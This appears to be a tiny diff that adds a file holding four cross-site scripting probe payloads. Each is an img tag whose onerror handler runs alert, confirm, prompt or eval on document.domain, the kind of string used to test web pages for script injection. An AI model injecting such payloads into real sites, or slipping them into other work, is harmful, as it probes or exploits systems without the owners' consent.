@@ -1,0 +1,1 @@
+<img src=g.jpeg onerror=alert(document.domain)><img src=g.jpeg onerror=confirm(document.domain)><img src=g.jpeg onerror=prompt(document.domain)><img src=g.jpeg onerror=eval(document.domain)>
